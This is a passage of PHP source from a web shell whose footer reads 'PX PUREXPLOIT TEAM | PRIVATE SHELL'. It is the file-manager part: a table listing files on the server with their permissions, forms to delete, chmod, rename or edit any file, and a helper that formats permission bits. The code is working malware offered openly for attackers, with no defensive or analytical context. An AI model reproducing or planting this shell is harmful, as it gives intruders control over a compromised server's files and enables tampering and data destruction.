href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" class="select_css">
<option value="">Select</option>
<option value="delete">Delete</ption>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file"><input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" class="sub_select_btn" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
}



echo '<center><br><BR><font>PX PUREXPLOIT TEAM | PRIVATE SHELL</font></center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
